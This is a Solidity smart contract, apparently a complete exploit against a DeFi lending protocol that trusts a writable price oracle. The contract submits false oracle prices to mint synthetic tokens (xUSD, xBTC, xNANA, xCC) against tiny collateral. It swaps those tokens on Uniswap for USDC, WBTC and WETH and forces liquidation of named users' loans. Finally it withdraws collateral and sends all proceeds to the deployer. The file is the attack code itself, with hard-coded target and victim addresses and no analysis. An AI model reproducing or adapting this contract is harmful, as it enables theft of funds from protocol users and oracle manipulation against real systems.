// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IOpenOracleFramework {
    function submitFeed(
        uint256[] memory feedIDs,
        uint256[] memory values
    ) external;

    function getFeed(
        uint256 feedID
    ) external view returns (uint256, uint256, uint256);
}

interface IXToken is IERC20 {
    function getLatestETHUSDPrice() external view returns (uint);

    function getLatestPrice() external view returns (uint);
}

interface IEtherCollateral {
    function openLoan(
        uint256 _loanAmount
    ) external payable returns (uint256 loanID);

    function loanAmountFromCollateral(
        uint256 collateralAmount
    ) external view returns (uint256);

    function liquidateLoan(
        address _loanCreatorsAddress,
        uint256 _loanID,
        uint256 _debtToCover
    ) external;

    function repayLoan(
        address _loanCreatorsAddress,
        uint256 _loanID,
        uint256 _repayAmount
    ) external;

    function withdrawCollateral(
        uint256 loanID,
        uint256 withdrawAmount
    ) external;
}

struct Liquidation {
    address loanCreator;
    uint loanId;
    uint amount;
}

contract Arouse {
    address owner;
    IOpenOracleFramework oracle =
        IOpenOracleFramework(0x00f0feed50DcDF57b4f1B532E8f5e7f291E0C84b);
    IXToken xUSD = IXToken(0x118CC5A08beBc41695Ecd1bb0d8Bb60E68dd8d65);
    IXToken xBTC = IXToken(0xb83534012b183746cFFdFe6AbBA359Cc2720d1cd);
    IXToken xNANA = IXToken(0x13A1105D770c19f0bc7EAa63CB3F7B5B06f01966);
    IXToken xCC = IXToken(0x7b4d9e591c6324cBBB1355bC50A27892Fd2af99c);
    IEtherCollateral usdControl =
        IEtherCollateral(0xe365d01b9A484747F2d1c7B7CdA697020E709fFd);
    IEtherCollateral btcControl =
        IEtherCollateral(0x72965768D9719F04A8b43f12CaEAf3a84F526873);
    IEtherCollateral nanaControl =
        IEtherCollateral(0x35876E24cA5c817E08EBcB24D82C748c5E2E3dB1);
    IEtherCollateral ccControl =
        IEtherCollateral(0x5ff07a6c0FF6cDcca7BEacD90964ebC14C678684);
    IUniswapV2Router router =
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor() {
        owner = msg.sender;
    }

    function evokee() external payable {
        _getBtc();
        _getUsd();
        _getNana();
        _getCC();

        _updateFeed(1900 ether); // your welcome

        payable(owner).transfer(address(this).balance);
        usdc.transfer(owner, usdc.balanceOf(address(this)));
        wbtc.transfer(owner, wbtc.balanceOf(address(this)));
        weth.transfer(owner, weth.balanceOf(address(this)));
    }

    function out(IERC20 token) external {
        if (address(this).balance > 0) {
            payable(owner).transfer(address(this).balance);
        }
        token.transfer(owner, token.balanceOf(address(this)));
    }

    function _updateFeed(uint value) internal {
        uint256[] memory feeds = new uint256[](1);
        feeds[0] = 0;

        uint256[] memory values = new uint256[](1);
        values[0] = value;

        oracle.submitFeed(feeds, values);
    }

    function _genericGet(
        IEtherCollateral controller,
        IXToken xToken,
        IERC20 swapToken,
        uint swapIn,
        uint swapOut,
        uint colIn,
        Liquidation[] memory liquidations
    ) internal {
        _updateFeed(10000000000 ether);

        uint loan = controller.loanAmountFromCollateral(colIn);
        uint loanId = controller.openLoan{value: 0.05 ether}(loan);

        address[] memory path = new address[](2);
        path[0] = address(xToken);
        path[1] = address(swapToken);

        xToken.approve(address(router), swapIn);
        router.swapExactTokensForTokens(
            swapIn,
            swapOut,
            path,
            address(this),
            block.timestamp
        );

        // start liquidation
        _updateFeed(1);

        for (uint i = 0; i < liquidations.length; i++) {
            Liquidation memory liq = liquidations[i];
            controller.liquidateLoan(liq.loanCreator, liq.loanId, liq.amount);
        }

        controller.repayLoan(
            address(this),
            loanId,
            xToken.balanceOf(address(this))
        ); // not necessary but fun

        _updateFeed(10000000000000000 ether);
        controller.withdrawCollateral(loanId, colIn);
    }

    function _getCC() internal {
        Liquidation[] memory liquidations = new Liquidation[](2);
        liquidations[0] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            1,
            50000000000000000
        );
        liquidations[1] = Liquidation(
            0x4602525fdEee4084aE863c5A81D605b498f4714e,
            9,
            100000000000000000
        );
    
        _genericGet(
            ccControl,
            xCC,
            weth,
            10000 ether,
            32809416853179046,
            0.0499 ether,
            liquidations
        );
    }

    function _getNana() internal {
        Liquidation[] memory liquidations = new Liquidation[](4);
        liquidations[0] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            1,
            100000000000000000000
        );
        liquidations[1] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            13,
            200000000000000000000
        );
        liquidations[2] = Liquidation(
            0x2A2CD7400F922085b62cA9Bd9AC0f16151f716Ab,
            11,
            32100000000000000000
        );
        liquidations[3] = Liquidation(
            0x1c053CCBca2784B8B5eeA4B51eB6aD9cB10a54B8,
            14,
            1000000000000000
        );

        _genericGet(
            nanaControl,
            xNANA,
            usdc,
            1000000 ether,
            138064040,
            0.0494 ether,
            liquidations
        );
    }

    function _getBtc() internal {
        Liquidation[] memory liquidations = new Liquidation[](4);
        liquidations[0] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            1,
            2000000000000000
        );
        liquidations[1] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            2,
            2000000000000000
        );
        liquidations[2] = Liquidation(
            0x1c053CCBca2784B8B5eeA4B51eB6aD9cB10a54B8,
            7,
            2000000000000000
        );
        liquidations[3] = Liquidation(
            0x609Ee908945c9CCa4055a4B6289B46717c726D5e,
            8,
            5577406228549
        );

        _genericGet(
            btcControl,
            xBTC,
            wbtc,
            10 ether,
            701173,
            0.0499 ether,
            liquidations
        );
    }

    function _getUsd() internal {
        Liquidation[] memory liquidations = new Liquidation[](4);
        liquidations[0] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            1,
            100000000000000000000
        );
        liquidations[1] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            2,
            100000000000000000000
        );
        liquidations[2] = Liquidation(
            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,
            15,
            2000000000000000000000
        );
        liquidations[3] = Liquidation(
            0xf1228C34651348F12d05D138896DC6d2E946F970,
            4,
            320000000000000000
        );

        _genericGet(
            usdControl,
            xUSD,
            usdc,
            1000000 ether,
            972251761,
            0.0499 ether,
            liquidations
        );
    }

    receive() external payable {}
}